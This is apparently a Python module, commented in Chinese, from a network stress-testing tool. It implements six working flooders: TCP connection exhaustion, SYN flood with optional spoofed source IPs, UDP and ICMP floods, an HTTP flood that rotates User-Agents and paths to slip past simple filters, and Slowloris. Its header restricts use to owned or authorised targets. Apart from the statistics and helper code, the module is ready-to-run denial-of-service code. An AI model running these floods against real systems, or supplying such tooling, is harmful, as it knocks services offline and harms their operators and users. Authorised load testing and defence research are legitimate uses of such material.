# -*- coding: utf-8 -*-
"""
压力测试 / 连接数测试
====================

把 TcpSessionBench 那类「并发连接数压测」和常见流量压力测试收在一处，
统一支持自定义 IP / 域名 / 端口，域名在开跑前自动解析。

包含六个压测器：

* `TcpSessionTest` —— 并发 TCP 连接数测试：建立并**长期保持**大量连接，
  周期性做存活探测，掉线的自动重连，用来摸清目标的连接表容量
* `TcpFlood`       —— TCP 压力：`syn` 模式发半开连接，`connect` 模式跑完整的
  三次握手再立刻断开
* `UdpFlood`       —— UDP 压力：随机长度载荷
* `IcmpFlood`      —— ICMP 压力：Echo Request 洪泛
* `HttpFlood`      —— HTTP 请求压力：可指定方法、并发、是否复用连接
* `Slowloris`      —— 慢速连接耗尽：请求头永远不发完，并持续续命

设计要点
--------
* 六个压测器共用一套骨架（线程池 + 停止开关 + 统计），所以界面只需要写一遍。
* `stop()` 保证在几秒内返回并释放所有 socket；**不会**在目标上留下任何状态。
* 统计全部加锁，界面每 500ms 取一次快照，不会读到写了一半的数据。
* 时间限制（`duration`）到点自动停，避免忘了关。
* 本模块**不做权限或授权判断**——那是界面层的事，但它也不主动绕过任何东西。

⚠ 只能用于你本人拥有、或已获得书面授权的目标。压测会真实占用对方的
带宽、连接表与 CPU，很可能造成业务在测试期间不可用。
"""

from __future__ import annotations

import random
import socket
import string
import threading
import time
from dataclasses import dataclass, field

from .logging_bus import log

DEFAULT_THREADS = 32
MAX_THREADS = 512
MAX_CONNECTIONS = 200000

# 慢速连接默认每隔多久续一次命（秒）
SLOWLORIS_KEEPALIVE = 10.0


# ============================ 目标解析 ============================


def resolve_target(text: str, cap: int = 256) -> tuple[list[str], str]:
    """
    把用户输入变成 IP 列表，支持单个 IP、域名、网段、区间与逗号分隔混用。

    返回 `(IP 列表, 说明文字)`；解析不出来时列表为空，说明里带原因。
    """
    text = (text or "").strip()
    if not text:
        return [], "请先填目标 IP 或域名"
    try:
        from .hostinfo import expand_targets
        ips = expand_targets(text, cap=cap)
    except Exception as exc:
        return [], f"解析目标失败：{type(exc).__name__}: {exc}"
    if not ips:
        return [], f"解析不出 IP：{text}"
    return ips, f"已解析 {len(ips)} 个目标"


def parse_rate(text: str) -> int:
    """解析速率输入，支持 '1000' / '1k' / '1M'，非法返回 0（=不限速）。"""
    s = (text or "").strip().lower().replace("/s", "").replace("pps", "").strip()
    if not s:
        return 0
    mult = 1
    if s.endswith("k"):
        mult, s = 1000, s[:-1]
    elif s.endswith("m"):
        mult, s = 1000000, s[:-1]
    try:
        return max(0, int(float(s) * mult))
    except ValueError:
        return 0


# ============================ 统计 ============================


@dataclass
class Stats:
    """压测过程中的计数器。所有写入都要拿锁，读的时候用 `snapshot()`。"""

    sent: int = 0            # 发出的请求 / 报文数
    ok: int = 0              # 成功的次数
    fail: int = 0            # 失败的次数
    active: int = 0          # 当前保持中的连接数
    peak_active: int = 0     # 连接数峰值
    bytes_out: int = 0       # 发出的字节数
    leases: int = 0          # DHCP 之类「拿到的东西」计数（通用槽位）
    started_at: float = 0.0
    errors: dict = field(default_factory=dict)
    _lock: threading.Lock = field(default_factory=threading.Lock, repr=False)
    _rtt: list = field(default_factory=list, repr=False)

    def reset(self) -> None:
        with self._lock:
            self.sent = self.ok = self.fail = self.active = 0
            self.peak_active = self.bytes_out = self.leases = 0
            self.started_at = time.time()
            self.errors.clear()
            self._rtt.clear()

    def add(self, *, sent=0, ok=0, fail=0, active=0, bytes_out=0, leases=0) -> None:
        with self._lock:
            self.sent += sent
            self.ok += ok
            self.fail += fail
            self.bytes_out += bytes_out
            self.leases += leases
            if active:
                self.active = max(0, self.active + active)
                self.peak_active = max(self.peak_active, self.active)

    def note_error(self, text: str) -> None:
        """把错误按类型归并计数，界面只显示前几名，避免刷屏。"""
        with self._lock:
            self.errors[text] = self.errors.get(text, 0) + 1

    def note_rtt(self, seconds: float) -> None:
        with self._lock:
            if len(self._rtt) < 4096:
                self._rtt.append(seconds)

    def snapshot(self) -> dict:
        with self._lock:
            elapsed = max(0.001, time.time() - self.started_at) if self.started_at else 0.0
            rtt = sorted(self._rtt)
            top = sorted(self.errors.items(), key=lambda kv: -kv[1])[:4]
            return {
                "sent": self.sent,
                "ok": self.ok,
                "fail": self.fail,
                "active": self.active,
                "peak_active": self.peak_active,
                "bytes_out": self.bytes_out,
                "leases": self.leases,
                "elapsed": elapsed,
                "rate": (self.sent / elapsed) if elapsed else 0.0,
                "ok_rate": (self.ok / elapsed) if elapsed else 0.0,
                "rtt_avg_ms": (sum(rtt) / len(rtt) * 1000) if rtt else 0.0,
                "rtt_p95_ms": (rtt[int(len(rtt) * 0.95)] * 1000) if rtt else 0.0,
                "errors": top,
                "error_kinds": len(self.errors),
            }

    def active_count(self) -> int:
        """热路径专用：只要当前连接数，不做任何拼装。"""
        with self._lock:
            return self.active


# ============================ 骨架 ============================


class StressBase:
    """
    压测器骨架：起 N 个线程跑 `_worker(tid)`，统一管理停止与统计。

    子类只需要实现 `_worker()`，并在循环里用 `self._should_stop()` 判断退出。
    """

    kind = "base"
    title = "压测"

    def __init__(self, targets: list[str], threads: int = DEFAULT_THREADS,
                 duration: float = 0.0, rate: int = 0):
        self.targets = [t for t in (targets or []) if t]
        self.threads = max(1, min(int(threads or 1), MAX_THREADS))
        self.duration = max(0.0, float(duration or 0.0))
        self.rate = max(0, int(rate or 0))
        self.stats = Stats()
        # 注意：绝不能叫 self._stop —— Thread 自己有个 _stop 方法，
        # 覆盖掉会让 join() 出问题，历史上直接把整个进程搞崩过。
        self._stop_evt = threading.Event()
        self._workers: list[threading.Thread] = []
        self._deadline = 0.0

    # ---------------- 生命周期 ----------------

    def start(self) -> bool:
        if self.is_running():
            return False
        if not self.targets:
            log(f"{self.title}：没有可用目标", "error", "stress")
            return False
        self._stop_evt.clear()
        self.stats.reset()
        self._deadline = time.time() + self.duration if self.duration else 0.0
        self._workers = []
        for tid in range(self.threads):
            t = threading.Thread(target=self._run_worker, args=(tid,),
                                 name=f"{self.kind}-{tid}", daemon=True)
            t.start()
            self._workers.append(t)
        log(f"{self.title} 已启动：{len(self.targets)} 个目标 / {self.threads} 线程"
            + (f" / 限时 {self.duration:g}s" if self.duration else ""), "info", "stress")
        return True

    def stop(self, timeout: float = 6.0) -> None:
        """置停止位并等所有线程收尾。整体等待时间有上限，不会卡住界面。"""
        self._stop_evt.set()
        deadline = time.time() + max(0.5, timeout)
        for t in self._workers:
            if not t.is_alive():
                continue
            left = deadline - time.time()
            if left <= 0:
                break
            t.join(left)
        alive = [t for t in self._workers if t.is_alive()]
        self._workers = []
        if alive:
            log(f"{self.title}：还有 {len(alive)} 个线程没退出（超时），"
                f"它们会在下一轮循环自行结束", "warn", "stress")
        log(f"{self.title} 已停止", "info", "stress")

    def is_running(self) -> bool:
        return any(t.is_alive() for t in self._workers)

    def snapshot(self) -> dict:
        snap = self.stats.snapshot()
        snap["running"] = self.is_running()
        snap["kind"] = self.kind
        return snap

    # ---------------- 内部 ----------------

    def _should_stop(self) -> bool:
        if self._stop_evt.is_set():
            return True
        if self._deadline and time.time() >= self._deadline:
            return True
        return False

    def _run_worker(self, tid: int) -> None:
        try:
            self._worker(tid)
        except Exception as exc:                   # 单个线程崩了不该拖垮整体
            self.stats.note_error(f"{type(exc).__name__}: {exc}")
            log(f"{self.title} 线程 {tid} 异常：{type(exc).__name__}: {exc}",
                "error", "stress")

    def _pick(self, tid: int, seq: int = 0) -> str:
        return self.targets[(tid + seq) % len(self.targets)]

    def _pace(self) -> None:
        """限速：按 rate 均摊到每个线程。rate=0 表示不限速。"""
        if self.rate:
            time.sleep(max(0.0, self.threads / float(self.rate)))

    def _worker(self, tid: int) -> None:
        raise NotImplementedError


# ============================ 1. 并发连接数 ============================


class TcpSessionTest(StressBase):
    """
    并发 TCP 连接数测试（TcpSessionBench 那类工具的核心）。

    持续建立连接直到达到 `connections` 个并发，然后**保持住**并周期性做存活
    探测；被对端关掉的会自动补上。用来测目标能同时挂住多少条连接、
    以及在压力下新连接还能不能建起来。
    """

    kind = "tcp-session"
    title = "TCP 连接数测试"

    def __init__(self, targets: list[str], port: int = 80,
                 connections: int = 500, threads: int = 64,
                 hold: float = 0.0, connect_timeout: float = 3.0,
                 check_interval: float = 5.0, duration: float = 0.0):
        super().__init__(targets, threads=threads, duration=duration, rate=0)
        self.port = int(port)
        self.connections = max(1, min(int(connections), MAX_CONNECTIONS))
        self.hold = max(0.0, float(hold or 0.0))
        self.connect_timeout = max(0.2, float(connect_timeout or 3.0))
        self.check_interval = max(1.0, float(check_interval or 5.0))

    def _connect(self, ip: str):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.connect_timeout)
        try:
            s.connect((ip, self.port))
        except Exception as exc:
            s.close()
            self.stats.add(fail=1)
            self.stats.note_error(_short_err(exc))
            return None
        s.settimeout(None)
        return s

    @staticmethod
    def _alive(sock) -> bool:
        """用 MSG_PEEK 看一眼：对端关了会返回空字节，没数据会抛 BlockingIOError。"""
        try:
            sock.setblocking(False)
            return sock.recv(1, socket.MSG_PEEK) != b""
        except BlockingIOError:
            return True
        except InterruptedError:
            return True
        except OSError:
            return False
        finally:
            try:
                sock.setblocking(True)
            except OSError:
                pass

    def _worker(self, tid: int) -> None:
        mine: list[tuple] = []                     # [(sock, 建立时刻)]
        seq = 0
        try:
            while not self._should_stop():
                # --- 补足连接 ---
                while not self._should_stop():
                    if self.stats.active_count() >= self.connections:
                        break
                    ip = self._pick(tid, seq)
                    seq += 1
                    t0 = time.time()
                    s = self._connect(ip)
                    if s is None:
                        time.sleep(0.05)           # 建不起来就退让一下再试
                        continue
                    mine.append((s, t0))
                    self.stats.add(sent=1, ok=1, active=1)
                    self.stats.note_rtt(time.time() - t0)

                if not mine:
                    time.sleep(0.2)
                    continue

                # --- 保持 + 存活探测 ---
                deadline = time.time() + self.check_interval
                while not self._should_stop() and time.time() < deadline:
                    time.sleep(0.1)

                now = time.time()
                keep = []
                for s, born in mine:
                    if self.hold and now - born >= self.hold:
                        _close(s)                      # 到点主动换新连接
                        self.stats.add(active=-1)
                        continue
                    if self._alive(s):
                        keep.append((s, born))
                    else:
                        _close(s)
                        self.stats.add(active=-1, fail=1)
                        self.stats.note_error("连接被对端关闭")
                mine = keep
        finally:
            for s, _ in mine:
                _close(s)
            if mine:
                self.stats.add(active=-len(mine))


# ============================ 2. TCP 压力 ============================


class TcpFlood(StressBase):
    """
    TCP 压力测试。

    * `syn`      —— 发半开连接（SYN），最贴近传统 SYN Flood；需要管理员 + Npcap
    * `connect`  —— 完整三次握手后立刻断开，不需要管理员

    `spoof_source=True` 时会随机化源 IP（仅在你自己控制的网段里才有意义）。
    """

    kind = "tcp-flood"
    title = "TCP 压力测试"

    def __init__(self, targets: list[str], port: int = 80, mode: str = "connect",
                 threads: int = DEFAULT_THREADS, duration: float = 0.0,
                 rate: int = 0, iface: str = "", spoof_source: bool = False,
                 payload_size: int = 0):
        super().__init__(targets, threads=threads, duration=duration, rate=rate)
        self.port = int(port)
        self.mode = mode if mode in ("connect", "syn") else "connect"
        self.iface = iface
        self.spoof_source = bool(spoof_source)
        self.payload_size = max(0, min(int(payload_size or 0), 1400))

    def _worker(self, tid: int) -> None:
        if self.mode == "syn":
            self._syn_worker(tid)
        else:
            self._connect_worker(tid)

    def _connect_worker(self, tid: int) -> None:
        seq = 0
        payload = b"X" * self.payload_size
        while not self._should_stop():
            ip = self._pick(tid, seq)
            seq += 1
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            try:
                s.connect((ip, self.port))
                if payload:
                    s.sendall(payload)
                self.stats.add(sent=1, ok=1, bytes_out=len(payload))
            except Exception as exc:
                self.stats.add(sent=1, fail=1)
                self.stats.note_error(_short_err(exc))
            finally:
                _close(s)
            self._pace()

    def _syn_worker(self, tid: int) -> None:
        from scapy.all import IP, TCP
        from . import rawsock
        batch = max(1, min(64, self.threads))
        seq = 0
        while not self._should_stop():
            pkts = []
            for _ in range(batch):
                ip = self._pick(tid, seq)
                seq += 1
                src = (_random_ip() if self.spoof_source else None)
                l3 = IP(dst=ip, src=src) if src else IP(dst=ip)
                pkts.append(l3 / TCP(sport=random.randint(1024, 65535),
                                     dport=self.port, flags="S",
                                     seq=random.randint(0, 2 ** 32 - 1)))
            sent = rawsock.send_packets(pkts, self.iface)
            self.stats.add(sent=len(pkts), ok=sent, fail=len(pkts) - sent,
                           bytes_out=sum(len(p) for p in pkts))
            if sent == 0:
                self.stats.note_error("发包失败（检查管理员权限 / Npcap / 网卡）")
                time.sleep(0.5)
            self._pace()


# ============================ 3. UDP 压力 ============================


class UdpFlood(StressBase):
    """UDP 压力测试：向目标端口持续发随机长度载荷，不需要管理员权限。"""

    kind = "udp-flood"
    title = "UDP 压力测试"

    def __init__(self, targets: list[str], port: int = 1234,
                 threads: int = DEFAULT_THREADS, duration: float = 0.0,
                 rate: int = 0, payload_size: int = 512):
        super().__init__(targets, threads=threads, duration=duration, rate=rate)
        self.port = int(port)
        self.payload_size = max(1, min(int(payload_size or 512), 65000))

    def _worker(self, tid: int) -> None:
        seq = 0
        while not self._should_stop():
            ip = self._pick(tid, seq)
            seq += 1
            data = random.randbytes(self.payload_size)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.sendto(data, (ip, self.port))
                self.stats.add(sent=1, ok=1, bytes_out=len(data))
            except Exception as exc:
                self.stats.add(sent=1, fail=1)
                self.stats.note_error(_short_err(exc))
            finally:
                _close(s)
            self._pace()


# ============================ 4. ICMP 压力 ============================


class IcmpFlood(StressBase):
    """ICMP 压力测试：Echo Request 洪泛。需要管理员 + Npcap。"""

    kind = "icmp-flood"
    title = "ICMP 压力测试"

    def __init__(self, targets: list[str], threads: int = DEFAULT_THREADS,
                 duration: float = 0.0, rate: int = 0, iface: str = "",
                 payload_size: int = 32):
        super().__init__(targets, threads=threads, duration=duration, rate=rate)
        self.iface = iface
        self.payload_size = max(0, min(int(payload_size or 32), 1400))

    def _worker(self, tid: int) -> None:
        from scapy.all import ICMP, IP
        from . import rawsock
        batch = max(1, min(64, self.threads))
        seq = 0
        while not self._should_stop():
            pkts = [IP(dst=self._pick(tid, seq + i))
                    / ICMP(type=8, id=random.randint(0, 65535), seq=i)
                    / (b"X" * self.payload_size)
                    for i in range(batch)]
            seq += batch
            sent = rawsock.send_packets(pkts, self.iface)
            self.stats.add(sent=len(pkts), ok=sent, fail=len(pkts) - sent,
                           bytes_out=sum(len(p) for p in pkts))
            if sent == 0:
                self.stats.note_error("发包失败（检查管理员权限 / Npcap / 网卡）")
                time.sleep(0.5)
            self._pace()


# ============================ 5. HTTP 压力 ============================


class HttpFlood(StressBase):
    """
    HTTP 请求压力测试。

    * `keep_alive=True`  复用同一条 TCP 连接连续发请求（更像正常压测流量）
    * `keep_alive=False` 每个请求新建连接（更费目标资源）
    * 请求路径、User-Agent 都可以在多个候选里随机挑，避免被简单规则一刀切
    """

    kind = "http-flood"
    title = "HTTP 压力测试"

    PATHS = ["/", "/index.html", "/api", "/api/v1", "/search?q=test",
             "/login", "/images/logo.png", "/static/app.js", "/?id=1"]
    AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17",
        "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/121.0",
        "curl/8.4.0",
    ]

    def __init__(self, targets: list[str], port: int = 80, https: bool = False,
                 host_header: str = "", method: str = "GET", threads: int = 32,
                 duration: float = 0.0, rate: int = 0, keep_alive: bool = True,
                 paths: list[str] | None = None, body: str = ""):
        super().__init__(targets, threads=threads, duration=duration, rate=rate)
        self.port = int(port)
        self.https = bool(https)
        self.host_header = host_header or ""
        self.method = (method or "GET").upper()
        self.keep_alive = bool(keep_alive)
        self.paths = [p for p in (paths or self.PATHS) if p] or self.PATHS
        self.body = body or ""

    def _request_bytes(self, host: str, path: str) -> bytes:
        head = [
            f"{self.method} {path} HTTP/1.1",
            f"Host: {self.host_header or host}",
            f"User-Agent: {random.choice(self.AGENTS)}",
            "Accept: */*",
            "Accept-Encoding: identity",
            "Connection: " + ("keep-alive" if self.keep_alive else "close"),
        ]
        if self.body:
            head.append(f"Content-Length: {len(self.body)}")
            head.append("Content-Type: application/x-www-form-urlencoded")
        head.append("")
        head.append(self.body)
        return ("\r\n".join(head) + "\r\n").encode("utf-8", "replace")

    def _open(self, ip: str):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.0)
        s.connect((ip, self.port))
        if self.https:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE      # 压测不校验证书
            s = ctx.wrap_socket(s, server_hostname=self.host_header or ip)
        s.settimeout(3.0)
        return s

    def _worker(self, tid: int) -> None:
        seq = 0
        sock = None
        try:
            while not self._should_stop():
                ip = self._pick(tid, seq)
                seq += 1
                path = random.choice(self.paths)
                try:
                    if sock is None:
                        sock = self._open(ip)
                    sock.sendall(self._request_bytes(ip, path))
                    try:
                        sock.recv(512)                     # 只读一点，不解析
                    except socket.timeout:
                        pass
                    self.stats.add(sent=1, ok=1)
                except Exception as exc:
                    self.stats.add(sent=1, fail=1)
                    self.stats.note_error(_short_err(exc))
                    _close(sock)
                    sock = None
                    time.sleep(0.2)
                    continue
                if not self.keep_alive:
                    _close(sock)
                    sock = None
                self._pace()
        finally:
            _close(sock)


# ============================ 6. Slowloris ============================


class Slowloris(StressBase):
    """
    慢速连接耗尽（Slowloris）。

    每个连接都把请求头**卡在没发完的状态**，然后每隔一段时间补一行没用的头，
    让服务端一直等下去，从而占住它的工作线程 / 连接槽位。
    """

    kind = "slowloris"
    title = "Slowloris 慢速连接"

    def __init__(self, targets: list[str], port: int = 80, connections: int = 300,
                 threads: int = 16, keepalive: float = SLOWLORIS_KEEPALIVE,
                 duration: float = 0.0, host_header: str = "",
                 connect_timeout: float = 3.0):
        super().__init__(targets, threads=threads, duration=duration, rate=0)
        self.port = int(port)
        self.connections = max(1, min(int(connections), MAX_CONNECTIONS))
        self.keepalive = max(1.0, float(keepalive or SLOWLORIS_KEEPALIVE))
        self.host_header = host_header or ""
        self.connect_timeout = max(0.2, float(connect_timeout or 3.0))

    def _hello(self, host: str) -> bytes:
        return (f"GET /?{_rand_token(6)} HTTP/1.1\r\n"
                f"Host: {self.host_header or host}\r\n"
                f"User-Agent: {_rand_token(12)}\r\n"
                "Accept: */*\r\n").encode()

    def _worker(self, tid: int) -> None:
        mine: list = []
        seq = 0
        try:
            while not self._should_stop():
                # 先把连接数补到目标
                while not self._should_stop():
                    if self.stats.active_count() >= self.connections:
                        break
                    ip = self._pick(tid, seq)
                    seq += 1
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(self.connect_timeout)
                    try:
                        s.connect((ip, self.port))
                        s.sendall(self._hello(ip))
                    except Exception as exc:
                        _close(s)
                        self.stats.add(fail=1)
                        self.stats.note_error(_short_err(exc))
                        time.sleep(0.3)
                        continue
                    mine.append([s, ip])
                    self.stats.add(sent=1, ok=1, active=1)

                # 续命：每隔 keepalive 给每条连接补一行头
                deadline = time.time() + self.keepalive
                while not self._should_stop() and time.time() < deadline:
                    time.sleep(0.2)

                keep = []
                for item in mine:
                    s, ip = item
                    try:
                        s.sendall(f"X-{_rand_token(5)}: {_rand_token(8)}\r\n".encode())
                        keep.append(item)
                    except Exception:
                        _close(s)
                        self.stats.add(active=-1, fail=1)
                mine = keep
        finally:
            for s, _ in mine:
                _close(s)
            if mine:
                self.stats.add(active=-len(mine))


# ============================ 小工具 ============================


def _close(sock) -> None:
    if sock is None:
        return
    try:
        sock.close()
    except Exception:
        pass


def _short_err(exc: Exception) -> str:
    """把异常归成一个短标签，便于按类计数。"""
    if isinstance(exc, socket.timeout):
        return "超时"
    if isinstance(exc, ConnectionRefusedError):
        return "连接被拒绝"
    if isinstance(exc, ConnectionResetError):
        return "连接被重置"
    if isinstance(exc, ConnectionAbortedError):
        return "连接被中止"
    if isinstance(exc, socket.gaierror):
        return "域名解析失败"
    if isinstance(exc, OSError):
        # Windows 上 connect 失败常常只抛一个光秃秃的 OSError，
        # 只有 winerror 能说明到底是端口耗尽还是对端拒绝，必须带上。
        we = getattr(exc, "winerror", None)
        if we == 10055:
            return "本机端口耗尽（WSAENOBUFS）"
        if we == 10061:
            return "连接被拒绝"
        if we == 10060:
            return "连接超时"
        if we == 10054:
            return "连接被重置"
        if we == 10048:
            return "地址已被占用"
        if we:
            return f"OSError {we}"
    return type(exc).__name__


def _random_ip() -> str:
    return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                            random.randint(0, 255), random.randint(1, 254))


def _rand_token(n: int) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def local_port_usage() -> dict:
    """
    本机当前 TCP 连接数与端口占用概况。

    压测时很有用：Windows 默认动态端口只有 16384 个（`netsh int ipv4 show
    dynamicport tcp`），连接数测试很容易先把自己的端口用光，
    看到这个数字才能分清「目标扛不住」和「本机没端口了」。
    """
    info = {"tcp": 0, "udp": 0, "states": {}, "dynamic_range": None}
    try:
        import psutil
        for c in psutil.net_connections(kind="tcp"):
            info["tcp"] += 1
            st = getattr(c, "status", "") or ""
            info["states"][st] = info["states"].get(st, 0) + 1
        info["udp"] = len(psutil.net_connections(kind="udp"))
    except Exception:
        try:
            import subprocess
            out = subprocess.run(["netstat", "-an"], capture_output=True,
                                 text=True, timeout=20, errors="replace").stdout
            info["tcp"] = sum(1 for ln in out.splitlines() if "TCP" in ln.upper())
            info["udp"] = sum(1 for ln in out.splitlines() if "UDP" in ln.upper())
        except Exception:
            pass
    return info


# 给界面用的注册表：显示名 -> 类
KINDS = {
    TcpSessionTest.kind: TcpSessionTest,
    TcpFlood.kind: TcpFlood,
    UdpFlood.kind: UdpFlood,
    IcmpFlood.kind: IcmpFlood,
    HttpFlood.kind: HttpFlood,
    Slowloris.kind: Slowloris,
}
